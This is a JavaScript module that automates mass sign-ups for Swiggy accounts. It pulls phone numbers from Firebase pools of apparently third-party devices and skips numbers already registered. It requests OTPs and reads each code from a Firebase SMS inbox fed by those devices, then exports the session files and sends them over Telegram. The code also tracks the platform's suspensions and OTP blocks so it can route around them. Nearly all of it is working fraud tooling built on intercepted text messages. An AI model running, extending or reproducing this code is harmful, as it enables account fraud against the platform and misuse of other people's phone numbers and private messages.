// ===== Parallel Firebase Fresh-Only Registration Engine =====
// When Firebase Mode is ON:
//   1. Pulls numbers from health-ranked Firebase Realtime DB pools (clients/ or legacy numbers/)
//   2. Probes active/ONLINE devices via scanFreshDevices (ported from hulm0408/workwr)
//   3. Runs N parallel virtual lanes (zero Telegram MTProto accounts required!)
//   4. MANDATORY check_mobile: ALREADY REGISTERED numbers are IMMEDIATELY SKIPPED & cached 30d
//   5. ONLY FRESH (is_new: true) numbers receive Swiggy OTP -> live Firebase SMS inbox poll ->
//      verify_otp (with stray/invalid OTP retry) -> 3x export -> atomic commit -> Telegram .json DM!

import {
  listPoolNumbers,
  scanFreshDevices,
  snapshotSeenOtpState,
  waitForOtpCode,
} from './firebase-client.js';

const sleep = (ms) => new Promise((r) => setTimeout(r, Math.max(0, Number(ms) || 0)));

export class FirebaseManager {
  constructor({
    db,
    toingClient,
    getRuntimeConfig,
    onSignupSuccess = null,
    fetchImpl = fetch,
    logger = console,
    otpPollMs = 1_500,
    otpInitialWaitMs = 2_500,
    idlePassDelayMs = 5_000,
  } = {}) {
    this.db = db;
    this.toingClient = toingClient;
    this.getRuntimeConfig = getRuntimeConfig;
    this.onSignupSuccess = onSignupSuccess;
    this.fetchImpl = fetchImpl;
    this.logger = logger;
    this.otpPollMs = Math.max(20, Number(otpPollMs) || 1_500);
    this.otpInitialWaitMs = Math.max(0, Number(otpInitialWaitMs ?? 2_500));
    this.idlePassDelayMs = Math.max(50, Number(idlePassDelayMs) || 5_000);

    this.desiredRunning = false;
    this.running = false;
    this.stopRequested = false;

    this._laneLoops = new Map(); // laneNo -> Promise
    this._laneStates = new Map(); // laneNo -> { laneNo, stage, phone, sourceName, updatedAt, created, skippedReg, fails }

    // Shared source coordinator state
    this._hotQueue = []; // [{ entry, source, lastActivityMs, onlineFallback }]
    this._refillPromise = null;
    this._resetAfterRefill = false;
    this._runSources = [];
    this._sourceIdx = -1;
    this._currentSource = null;
    this._currentPool = [];
    this._probedDevices = new Set();
    this._legacyOffset = 0;
    this._sessionQueuedPhones = new Set();
    this._sourceTimeoutStreaks = new Map();

    // Live telemetry counters for Dashboard & /firebase
    this.passCount = 0;
    this.sourcesTriedInRun = 0;
    this.currentPoolSize = 0;
    this.currentUnseenSize = 0;
    this.lastScanChecked = 0;
    this.lastScanTotalDevices = 0;
    this.createdInRun = 0;
    this.skippedRegisteredInRun = 0;
    this.skippedCooldownInRun = 0;
    this.otpTimeoutsInRun = 0;
    this.lastError = '';
    this.startedAt = 0;
  }

  _isAborted() {
    return this.stopRequested || !this.desiredRunning;
  }

  async _sleepInterruptible(ms) {
    const end = Date.now() + Math.max(0, Number(ms) || 0);
    while (Date.now() < end && !this._isAborted()) {
      await sleep(Math.min(200, end - Date.now()));
    }
  }

  _setLaneStage(laneNo, stage, phone = '', sourceName = '') {
    const st = this._laneStates.get(laneNo) || {
      laneNo,
      stage: 'idle',
      phone: '',
      sourceName: '',
      updatedAt: Date.now(),
      created: 0,
      skippedReg: 0,
      fails: 0,
    };
    st.stage = stage;
    st.phone = phone;
    if (sourceName) st.sourceName = sourceName;
    st.updatedAt = Date.now();
    this._laneStates.set(laneNo, st);
    return st;
  }

  _resetCoordinator() {
    this._hotQueue = [];
    this._runSources = [];
    this._sourceIdx = -1;
    this._currentSource = null;
    this._currentPool = [];
    this._probedDevices = new Set();
    this._legacyOffset = 0;
    this._sessionQueuedPhones = new Set();
    this._sourceTimeoutStreaks = new Map();
    this.currentPoolSize = 0;
    this.currentUnseenSize = 0;
  }

  _recordSourceOtpOutcome(source, receivedOtp) {
    const srcId = source?.id;
    if (!srcId) return;
    if (receivedOtp) {
      this._sourceTimeoutStreaks.delete(srcId);
      return;
    }
    const streak = (this._sourceTimeoutStreaks.get(srcId) || 0) + 1;
    this._sourceTimeoutStreaks.set(srcId, streak);
    if (streak >= 3) {
      this._sourceTimeoutStreaks.set(srcId, 0);
      try {
        this.db.recordFirebaseSourceResult(srcId, {
          ok: false,
          error: `otp_timeout_streak (${streak})`,
        });
      } catch {}
    }
  }

  async start() {
    // A previous stop can time out while a network call is still in flight.
    // Never revive those loops by resetting their shared stop flag.
    if (!this.desiredRunning && this._laneLoops.size) {
      await Promise.allSettled([...this._laneLoops.values()]);
    }
    const cfg = this.getRuntimeConfig();
    const sources = this.db.listFirebaseRunSources();
    if (!sources.length) {
      this.desiredRunning = false;
      this.lastError = 'Koi Firebase source added nahi hai';
      return { ok: false, reason: 'no_sources', totalSources: 0, lanes: 0 };
    }

    if (this.running && this.desiredRunning) {
      return { ok: true, alreadyRunning: true, totalSources: sources.length, lanes: this._laneLoops.size };
    }

    this.desiredRunning = true;
    this.stopRequested = false;
    this.running = true;
    this.startedAt = Date.now();
    this.lastError = '';
    this.db.setSetting('running', true);

    this._resetCoordinator();
    const concurrency = Math.max(1, Math.min(30, Number(cfg.firebaseConcurrency) || 12));

    this.logger?.info?.(
      `[Firebase] 🚀 Starting Fresh-Only engine: ${concurrency} parallel lanes | ${sources.length} source(s) (Already-Registered = AUTO SKIP)`
    );

    this._laneStates.clear();
    for (let laneNo = 1; laneNo <= concurrency; laneNo++) {
      this._setLaneStage(laneNo, 'starting', '', '');
      const loopPromise = this._laneLoop(laneNo).finally(() => {
        this._laneLoops.delete(laneNo);
        const st = this._laneStates.get(laneNo);
        if (st) st.stage = 'stopped';
        if (this._laneLoops.size === 0) {
          this.running = false;
        }
      });
      this._laneLoops.set(laneNo, loopPromise);
    }

    return { ok: true, totalSources: sources.length, lanes: concurrency };
  }

  async stop({ gracefulMs = 15_000, persistStopped = true } = {}) {
    this.desiredRunning = false;
    this.stopRequested = true;
    if (persistStopped) {
      this.db.setSetting('running', false);
    }

    const activeLoops = [...this._laneLoops.values()];
    if (activeLoops.length) {
      await Promise.race([
        Promise.allSettled(activeLoops),
        sleep(Math.max(500, Number(gracefulMs) || 15_000)),
      ]);
    }
    const drained = this._laneLoops.size === 0;
    if (drained) this._resetCoordinator();
    this.running = !drained;
    this.logger?.info?.(drained ? '[Firebase] 🛑 Stopped cleanly.' : '[Firebase] Stop requested; lanes still draining.');
    return { ok: drained, draining: !drained };
  }

  // Trigger a clean source refresh (e.g. after owner adds/changes primary Firebase source)
  resetSourceRotation() {
    // Don't mutate coordinator state under an in-flight network scan.
    if (this._refillPromise) {
      this._hotQueue = [];
      this._resetAfterRefill = true;
    } else {
      this._resetCoordinator();
    }
  }

  // ── Shared Pool Coordinator (Serialized across all N parallel lanes) ──────
  async _pullCandidate() {
    if (this._hotQueue.length > 0) {
      return this._hotQueue.shift();
    }
    if (this._isAborted()) return null;

    if (!this._refillPromise) {
      this._refillPromise = this._refillHotQueue().finally(() => {
        this._refillPromise = null;
        if (this._resetAfterRefill) {
          this._resetAfterRefill = false;
          this._resetCoordinator();
        }
      });
    }
    await this._refillPromise;
    return this._hotQueue.length > 0 ? this._hotQueue.shift() : null;
  }

  async _advanceToNextSource() {
    if (!this._runSources.length || this._sourceIdx + 1 >= this._runSources.length) {
      const freshSources = this.db.listFirebaseRunSources();
      if (!freshSources.length) {
        this._currentSource = null;
        this._currentPool = [];
        this.lastError = 'Koi Firebase source available nahi hai';
        return false;
      }
      if (this.passCount > 0) {
        // Completed a full pass over all sources — pause briefly so we don't spin aggressively
        this._sessionQueuedPhones.clear();
        await this._sleepInterruptible(this.idlePassDelayMs);
        if (this._isAborted()) return false;
      }
      this.passCount += 1;
      this._runSources = freshSources;
      this._sourceIdx = -1;
    }

    while (!this._isAborted() && this._sourceIdx + 1 < this._runSources.length) {
      this._sourceIdx += 1;
      const src = this._runSources[this._sourceIdx];
      this._currentSource = src;
      this._currentPool = [];
      this._probedDevices = new Set();
      this._legacyOffset = 0;
      this.currentPoolSize = 0;
      this.currentUnseenSize = 0;
      this.sourcesTriedInRun += 1;

      const t0 = Date.now();
      try {
        const pool = await listPoolNumbers(src, {
          timeoutMs: 25_000,
          fetchImpl: this.fetchImpl,
        });
        const ms = Date.now() - t0;
        const now = Date.now();
        const unseen = pool.filter(
          (e) => e?.phone && !this.db.isPhoneBlocked(e.phone, now, { ignoreAlreadyRegistered: false })
        );

        this.currentPoolSize = pool.length;
        this.currentUnseenSize = unseen.length;

        if (!pool.length) {
          this.db.recordFirebaseSourceResult(src.id, { ok: false, empty: true, error: 'khali pool (0 numbers)', ms });
          continue;
        }
        if (!unseen.length) {
          this.db.recordFirebaseSourceResult(src.id, { ok: false, empty: true, error: `sab ${pool.length} numbers already processed/cooldown`, ms });
          continue;
        }

        this.db.recordFirebaseSourceResult(src.id, { ok: true, ms });
        this._currentPool = pool;
        this.logger?.info?.(
          `[Firebase] 🔥 Loaded ${src.name} (${this._sourceIdx + 1}/${this._runSources.length}): total=${pool.length}, unseen=${unseen.length} (${ms}ms)`
        );
        return true;
      } catch (err) {
        const msg = String(err?.message || err || 'load failed').slice(0, 160);
        this.lastError = `${src.name}: ${msg}`.slice(0, 180);
        this.db.recordFirebaseSourceResult(src.id, { ok: false, error: msg, ms: Date.now() - t0 });
      }
    }

    return false;
  }

  async _refillHotQueue() {
    if (this._hotQueue.length > 0 || this._isAborted()) return;

    const cfg = this.getRuntimeConfig();
    const concurrency = Math.max(1, Math.min(30, Number(cfg.firebaseConcurrency) || 12));
    const activeWindowMs = Math.max(10_000, Number(cfg.firebaseActiveWindowMs) || 60_000);

    // Try up to all sources in one pass to fill hotQueue
    const maxSourceHops = Math.max(1, this._runSources.length || this.db.listFirebaseSources().length || 1);
    for (let hop = 0; hop < maxSourceHops && !this._isAborted(); hop++) {
      if (!this._currentSource || !this._currentPool.length) {
        const loaded = await this._advanceToNextSource();
        if (!loaded) return;
      }

      const now = Date.now();
      const unseen = this._currentPool.filter(
        (e) =>
          e?.phone &&
          !this._sessionQueuedPhones.has(e.phone) &&
          !this.db.isPhoneBlocked(e.phone, now, { ignoreAlreadyRegistered: false })
      );
      this.currentUnseenSize = unseen.length;

      if (!unseen.length) {
        this._currentSource = null;
        this._currentPool = [];
        continue;
      }

      // Split device-backed entries vs legacy flat entries
      const unprobedDeviceEntries = unseen.filter((e) => e.deviceId && !this._probedDevices.has(e.deviceId));
      const legacyEntries = unseen.filter((e) => !e.deviceId);

      if (!unprobedDeviceEntries.length && !legacyEntries.length) {
        this._currentSource = null;
        this._currentPool = [];
        continue;
      }

      const maxActivityAgeMs = Math.max(
        activeWindowMs * 15,
        Number(cfg.firebaseMaxActivityAgeMs) || 30 * 60_000
      );
      const scanTarget = unprobedDeviceEntries.length ? unprobedDeviceEntries : legacyEntries;
      const scanRes = await scanFreshDevices(this._currentSource, scanTarget, {
        windowMs: activeWindowMs,
        maxWidenMs: maxActivityAgeMs,
        widenByDoubling: true,
        earlyWidenStepMs: 4_000,
        maxScanMs: 12_000,
        onlineFallback: true,
        want: Math.max(8, concurrency * 2),
        backupCount: Math.max(24, concurrency * 3),
        chunkSize: 80,
        maxProbe: Math.max(400, scanTarget.length),
        concurrency: 32,
        fetchImpl: this.fetchImpl,
        shouldAbort: () => this._isAborted(),
      });

      this.lastScanChecked = scanRes.checked || 0;
      this.lastScanTotalDevices = scanRes.totalDevices || 0;
      for (const devId of scanRes.probedDeviceIds || []) {
        this._probedDevices.add(devId);
      }

      if (scanRes.fresh && scanRes.fresh.length > 0) {
        for (const item of scanRes.fresh) {
          const phone = item?.entry?.phone;
          if (!phone || this._sessionQueuedPhones.has(phone)) continue;
          this._sessionQueuedPhones.add(phone);
          this._hotQueue.push({
            entry: item.entry,
            source: this._currentSource,
            lastActivityMs: item.lastActivityMs || null,
            onlineFallback: Boolean(item.onlineFallback),
          });
        }
        if (this._hotQueue.length > 0) return;
      }

      // If scan produced nothing for remaining unprobed devices on this source, move to next source
      if (scanRes.exhausted || !unprobedDeviceEntries.length) {
        this._currentSource = null;
        this._currentPool = [];
      }
    }
  }

  // ── Per-Lane Worker Loop ──────────────────────────────────────────────────
  async _laneLoop(laneNo) {
    while (!this._isAborted()) {
      try {
        this._setLaneStage(laneNo, 'scanning', '', this._currentSource?.name || '');
        const candidate = await this._pullCandidate();
        if (this._isAborted()) break;
        if (!candidate) {
          this._setLaneStage(laneNo, 'idle', '', '');
          await this._sleepInterruptible(1_500);
          continue;
        }
        await this._processCandidate(laneNo, candidate);
      } catch (err) {
        this.lastError = `Lane #${laneNo}: ${String(err?.message || err)}`.slice(0, 180);
        this.logger?.warn?.(`[Firebase] Lane #${laneNo} error: ${this.lastError}`);
        await this._sleepInterruptible(1_000);
      }
    }
  }

  _logEvent(laneNo, { phone = '', sourceName = '', outcome = 'skip', reason = 'unknown', detail = '', durationMs = 0 } = {}) {
    const laneSlotId = -Math.abs(Number(laneNo) || 1);
    const otpBot = `fb:${String(sourceName || 'firebase').slice(0, 20)}`;
    try {
      this.db.recordNumberEvent({
        slotId: laneSlotId,
        slotNo: laneNo,
        phone,
        otpBot,
        outcome,
        reason,
        detail,
        durationMs,
      });
    } catch {}
    const icon = outcome === 'success' ? '✅' : outcome === 'drop' ? '❌' : '⏭';
    this.logger?.info?.(`[FB-Lane #${laneNo}] ${icon} ${outcome.toUpperCase()} ${phone || '-'} | reason=${reason} | ${detail}`);
  }

  // Exposed for direct unit testing & per-candidate execution
  async _processCandidate(laneNo, { entry, source }) {
    const cfg = this.getRuntimeConfig();
    const phone = String(entry?.phone || '');
    const sourceName = String(source?.name || 'firebase');
    const laneSlotId = -Math.abs(Number(laneNo) || 1);
    const cycleStart = Date.now();
    const laneState = this._setLaneStage(laneNo, 'claiming', phone, sourceName);

    if (!phone) return { ok: false, reason: 'invalid_phone' };

    // 1. Atomic DB lock — ALWAYS respect already_registered cooldown in Firebase mode!
    const lock = this.db.tryClaimPhone(phone, laneSlotId, {
      ttlMs: cfg.claimLockTtlMs,
      ignoreAlreadyRegistered: false,
    });
    if (!lock.ok) {
      this.skippedCooldownInRun += 1;
      return { ok: false, reason: lock.reason };
    }

    let lockedPhone = phone;
    try {
      if (this._isAborted()) return { ok: false, reason: 'aborted' };

      // 2. MANDATORY Pre-OTP check_mobile — ALWAYS skip already-registered numbers!
      this._setLaneStage(laneNo, 'checking', lockedPhone, sourceName);
      this.db.updateClaimStage(lockedPhone, laneSlotId, 'checking');

      const checkRes = await this.toingClient.checkMobile(lockedPhone, {
        shouldAbort: () => this._isAborted(),
      });
      if (checkRes.aborted || this._isAborted()) return { ok: false, reason: 'aborted' };

      if (checkRes.ok && checkRes.registered === true) {
        const skippedPhone = lockedPhone;
        this.skippedRegisteredInRun += 1;
        laneState.skippedReg += 1;
        this.db.markNumberUsed(skippedPhone, {
          status: 'already_registered',
          slotId: laneSlotId,
          cooldownDays: cfg.usedCooldownDays || 30,
          source: 'firebase_check',
        });
        lockedPhone = ''; // released inside markNumberUsed TX
        this.db.recordMetric(laneSlotId, 'already_registered_skip', Date.now() - cycleStart);
        this._logEvent(laneNo, {
          phone: skippedPhone,
          sourceName,
          outcome: 'skip',
          reason: 'already_registered',
          detail: `Already registered on Toing (Firebase Fresh-Only — OTP nahi bheja, src=${sourceName})`,
          durationMs: Date.now() - cycleStart,
        });
        return { ok: false, reason: 'already_registered' };
      }

      if (!checkRes.ok || checkRes.registered !== false) {
        this.db.recordMetric(laneSlotId, 'check_mobile_fail', Date.now() - cycleStart);
        this._logEvent(laneNo, {
          phone: lockedPhone,
          sourceName,
          outcome: 'skip',
          reason: 'check_mobile_failed',
          detail: `${checkRes.error || 'check_mobile uncertain'} — safe skip (OTP nahi bheja)`,
          durationMs: Date.now() - cycleStart,
        });
        return { ok: false, reason: 'check_mobile_failed' };
      }

      // Fresh number confirmed! (registered === false -> isNew = true)
      const isNew = true;
      const deviceIds = entry?.deviceId ? [entry.deviceId] : [];

      // 3. Snapshot Firebase OTP inbox watermark BEFORE send_otp so old SMSes are never picked up
      this._setLaneStage(laneNo, 'watermark', lockedPhone, sourceName);
      const watermark = await snapshotSeenOtpState(source, lockedPhone, {
        deviceIds,
        fetchImpl: this.fetchImpl,
      });
      if (this._isAborted()) return { ok: false, reason: 'aborted' };

      // 4. Send OTP via Toing Pro
      this._setLaneStage(laneNo, 'sending_otp', lockedPhone, sourceName);
      this.db.updateClaimStage(lockedPhone, laneSlotId, 'sending_otp');
      this.logger?.info?.(`[FB-Lane #${laneNo}] 📨 SEND_OTP ${lockedPhone} | FRESH 🆕 | src=${sourceName}`);

      const sendRes = await this.toingClient.sendOtp(lockedPhone, {
        shouldAbort: () => this._isAborted(),
        preferredKey: checkRes.key || '',
      });
      if (sendRes.aborted || this._isAborted()) return { ok: false, reason: 'aborted' };

      if (!sendRes.ok) {
        if (sendRes.alreadyRegistered) {
          const skippedPhone = lockedPhone;
          this.skippedRegisteredInRun += 1;
          laneState.skippedReg += 1;
          this.db.markNumberUsed(skippedPhone, {
            status: 'already_registered',
            slotId: laneSlotId,
            cooldownDays: cfg.usedCooldownDays || 30,
            source: 'firebase_send_otp',
          });
          lockedPhone = '';
          this.db.recordMetric(laneSlotId, 'already_registered_skip', Date.now() - cycleStart);
          this._logEvent(laneNo, {
            phone: skippedPhone,
            sourceName,
            outcome: 'skip',
            reason: 'already_registered',
            detail: sendRes.reason || 'Already Registered (send_otp)',
            durationMs: Date.now() - cycleStart,
          });
          return { ok: false, reason: 'already_registered' };
        }

        if (sendRes.suspended) {
          const suspendedPhone = lockedPhone;
          const coolDays = Math.max(1, Number(cfg.usedCooldownDays || 30));
          this.db.markNumberUsed(suspendedPhone, {
            status: 'suspended',
            slotId: laneSlotId,
            cooldownMs: coolDays * 24 * 60 * 60 * 1000,
            source: 'swiggy_suspended',
          });
          lockedPhone = '';
          this.db.recordMetric(laneSlotId, 'send_otp_fail', Date.now() - cycleStart);
          this._logEvent(laneNo, {
            phone: suspendedPhone,
            sourceName,
            outcome: 'skip',
            reason: 'account_suspended',
            detail: `${sendRes.reason || 'Swiggy account suspended'} (${coolDays}d cooldown)`,
            durationMs: Date.now() - cycleStart,
          });
          return { ok: false, reason: 'account_suspended' };
        }

        if (Number(sendRes.retryCooldownMs) > 0) {
          const blockedPhone = lockedPhone;
          const coolMin = Math.max(1, Math.round(sendRes.retryCooldownMs / 60_000));
          this.db.markNumberUsed(blockedPhone, {
            status: 'send_otp_blocked',
            slotId: laneSlotId,
            cooldownMs: sendRes.retryCooldownMs,
            source: 'swiggy_block',
          });
          lockedPhone = '';
          laneState.fails += 1;
          this.db.recordMetric(laneSlotId, 'send_otp_fail', Date.now() - cycleStart);
          this._logEvent(laneNo, {
            phone: blockedPhone,
            sourceName,
            outcome: 'drop',
            reason: 'send_otp_blocked',
            detail: `${sendRes.reason || 'Swiggy blocking OTPs'} (${coolMin}m cooldown)`,
            durationMs: Date.now() - cycleStart,
          });
          return { ok: false, reason: 'send_otp_blocked' };
        }

        laneState.fails += 1;
        this.db.recordMetric(laneSlotId, 'send_otp_fail', Date.now() - cycleStart);
        this._logEvent(laneNo, {
          phone: lockedPhone,
          sourceName,
          outcome: 'drop',
          reason: 'send_otp_failed',
          detail: `${sendRes.reason || 'send_otp failed'}${sendRes.status ? ` (HTTP ${sendRes.status})` : ''}`,
          durationMs: Date.now() - cycleStart,
        });
        return { ok: false, reason: 'send_otp_failed' };
      }

      // 5 + 6. Poll Firebase SMS inbox & verify OTP (with stray/invalid OTP retry loop!)
      const otpBudgetMs = Math.max(5_000, Number(cfg.firebaseOtpTimeoutMs) || 60_000);
      const otpStartedAt = Date.now();
      const otpDeadline = otpStartedAt + otpBudgetMs;
      const rejectedCodes = new Set();
      let totalPolls = 0;
      let wrongOtpRetries = 0;
      const maxWrongOtpRetries = 2;

      while (true) {
        const remainingMs = otpDeadline - Date.now();
        if (remainingMs < 1_500) {
          const timedOutPhone = lockedPhone;
          this.otpTimeoutsInRun += 1;
          laneState.fails += 1;
          this._recordSourceOtpOutcome(source, false);
          this.db.recordMetric(laneSlotId, 'otp_timeout', Date.now() - cycleStart);
          const coolMin = Number(cfg.otpTimeoutCooldownMin ?? 10);
          if (coolMin > 0) {
            this.db.markNumberUsed(timedOutPhone, {
              status: 'otp_timeout_cool',
              slotId: laneSlotId,
              cooldownMs: coolMin * 60_000,
              source: 'firebase_otp_timeout',
            });
            lockedPhone = '';
          }
          this._logEvent(laneNo, {
            phone: timedOutPhone,
            sourceName,
            outcome: 'drop',
            reason: 'otp_timeout',
            detail: `${((Date.now() - otpStartedAt) / 1000).toFixed(1)}s me Firebase inbox par valid OTP nahi aaya (${totalPolls} polls, src=${sourceName})`,
            durationMs: Date.now() - cycleStart,
          });
          return { ok: false, reason: 'otp_timeout' };
        }

        this._setLaneStage(laneNo, 'waiting_otp', lockedPhone, sourceName);
        this.db.updateClaimStage(lockedPhone, laneSlotId, 'waiting_otp');

        const otpRes = await waitForOtpCode(source, lockedPhone, {
          deviceIds,
          exclude: watermark,
          rejectedCodes,
          waitMs: wrongOtpRetries === 0 ? this.otpInitialWaitMs : 0,
          timeoutMs: remainingMs,
          pollMs: this.otpPollMs,
          acceptAnyAfterMs: 18_000,
          sinceTs: otpStartedAt - 15_000,
          shouldAbort: () => this._isAborted(),
          fetchImpl: this.fetchImpl,
        });
        totalPolls += Number(otpRes?.polls || 0);
        if (otpRes.aborted || this._isAborted()) return { ok: false, reason: 'aborted' };

        if (!otpRes.ok || !/^\d{6}$/.test(String(otpRes.code || ''))) {
          const timedOutPhone = lockedPhone;
          this.otpTimeoutsInRun += 1;
          laneState.fails += 1;
          this._recordSourceOtpOutcome(source, false);
          this.db.recordMetric(laneSlotId, 'otp_timeout', Date.now() - cycleStart);
          const coolMin = Number(cfg.otpTimeoutCooldownMin ?? 10);
          if (coolMin > 0) {
            this.db.markNumberUsed(timedOutPhone, {
              status: 'otp_timeout_cool',
              slotId: laneSlotId,
              cooldownMs: coolMin * 60_000,
              source: 'firebase_otp_timeout',
            });
            lockedPhone = '';
          }
          this._logEvent(laneNo, {
            phone: timedOutPhone,
            sourceName,
            outcome: 'drop',
            reason: 'otp_timeout',
            detail: `${((Date.now() - otpStartedAt) / 1000).toFixed(1)}s me Firebase inbox par OTP nahi aaya (${totalPolls} polls, src=${sourceName}${coolMin > 0 ? `, ${coolMin}m cool` : ''})`,
            durationMs: Date.now() - cycleStart,
          });
          return { ok: false, reason: 'otp_timeout' };
        }

        this._recordSourceOtpOutcome(source, true);

        // Verify OTP on Toing Pro (is_new: true)
        this._setLaneStage(laneNo, 'verifying', lockedPhone, sourceName);
        this.db.updateClaimStage(lockedPhone, laneSlotId, 'verifying');

        const verifyRes = await this.toingClient.verifyOtp({
          mobile: lockedPhone,
          otp: otpRes.code,
          sid: sendRes.sid,
          tid: sendRes.tid,
          deviceId: sendRes.deviceId,
          isNew,
        }, {
          shouldAbort: () => this._isAborted(),
          preferredKey: sendRes.key || '',
        });
        if (verifyRes.aborted || this._isAborted()) return { ok: false, reason: 'aborted' };

        if (verifyRes.ok) {
          break;
        }

        const verifyReason = String(verifyRes.reason || 'verify_otp failed');
        const isWrongOtp = /(invalid|incorrect|wrong|mismatch|enter.*valid.*otp)/i.test(verifyReason);
        const remAfterVerify = otpDeadline - Date.now();
        if (isWrongOtp && wrongOtpRetries < maxWrongOtpRetries && remAfterVerify >= 8_000) {
          wrongOtpRetries += 1;
          rejectedCodes.add(String(otpRes.code));
          this.logger?.info?.(
            `[FB-Lane #${laneNo}] 🔁 OTP ${otpRes.code} invalid on ${lockedPhone} — ignoring stray code & polling Firebase ${(remAfterVerify / 1000).toFixed(1)}s more`
          );
          continue;
        }

        laneState.fails += 1;
        this.db.recordMetric(laneSlotId, 'verify_fail', Date.now() - cycleStart);
        this._logEvent(laneNo, {
          phone: lockedPhone,
          sourceName,
          outcome: 'drop',
          reason: 'verify_failed',
          detail: `OTP ${otpRes.code} rejected: ${verifyReason}`,
          durationMs: Date.now() - cycleStart,
        });
        return { ok: false, reason: 'verify_failed' };
      }

      // 7. Export session JSON (3x automatic retry) & atomic commit
      this._setLaneStage(laneNo, 'exporting', lockedPhone, sourceName);
      this.db.updateClaimStage(lockedPhone, laneSlotId, 'exporting');

      const exportRes = await this.toingClient.exportAccount(lockedPhone, {
        otpState: sendRes,
        preferredKey: sendRes.key || '',
      });

      const durationMs = Date.now() - cycleStart;
      const otpBotTag = `firebase:${sourceName.slice(0, 14)}`;

      const committed = this.db.commitCompletedSignup({
        phone: lockedPhone,
        slotId: laneSlotId,
        otpBot: otpBotTag,
        isNew: true,
        exportObj: exportRes.exportObj,
        fileName: `toing-${lockedPhone}.json`,
        deliveryChatId: cfg.deliveryChatId || cfg.primaryOwnerId,
        cooldownDays: cfg.usedCooldownDays || 30,
        durationMs,
      });
      lockedPhone = '';

      this.createdInRun += 1;
      laneState.created += 1;

      this._logEvent(laneNo, {
        phone: committed.exportObj.mobile,
        sourceName,
        outcome: 'success',
        reason: 'created_new',
        detail: `NEW FRESH account exported via Firebase (${sourceName}) in ${(durationMs / 1000).toFixed(1)}s`,
        durationMs,
      });

      if (typeof this.onSignupSuccess === 'function') {
        try {
          this.onSignupSuccess({
            laneNo,
            phone: committed.exportObj.mobile,
            sourceName,
            isNew: true,
            durationMs,
            fileName: committed.fileName,
          });
        } catch {}
      }

      return { ok: true, phone: committed.exportObj.mobile, sessionId: committed.sessionId };
    } finally {
      if (lockedPhone) {
        try { this.db.releaseClaim(lockedPhone, laneSlotId); } catch {}
      }
      this._setLaneStage(laneNo, 'idle', '', sourceName);
    }
  }

  getSnapshot() {
    const health = this.db.getFirebaseHealthSummary();
    const stages = {};
    const lanes = [];
    for (const st of this._laneStates.values()) {
      stages[st.stage] = (stages[st.stage] || 0) + 1;
      lanes.push({ ...st });
    }
    return {
      desiredRunning: this.desiredRunning,
      running: this.running,
      activeLanes: this._laneLoops.size,
      stages,
      lanes,
      currentSource: this._currentSource ? { id: this._currentSource.id, name: this._currentSource.name, url: this._currentSource.url } : null,
      sourceIndex: this._sourceIdx >= 0 ? this._sourceIdx + 1 : 0,
      runSourcesTotal: this._runSources.length || health.total,
      hotQueueSize: this._hotQueue.length,
      currentPoolSize: this.currentPoolSize,
      currentUnseenSize: this.currentUnseenSize,
      lastScanChecked: this.lastScanChecked,
      lastScanTotalDevices: this.lastScanTotalDevices,
      passCount: this.passCount,
      createdInRun: this.createdInRun,
      skippedRegisteredInRun: this.skippedRegisteredInRun,
      skippedCooldownInRun: this.skippedCooldownInRun,
      otpTimeoutsInRun: this.otpTimeoutsInRun,
      lastError: this.lastError,
      health,
    };
  }
}
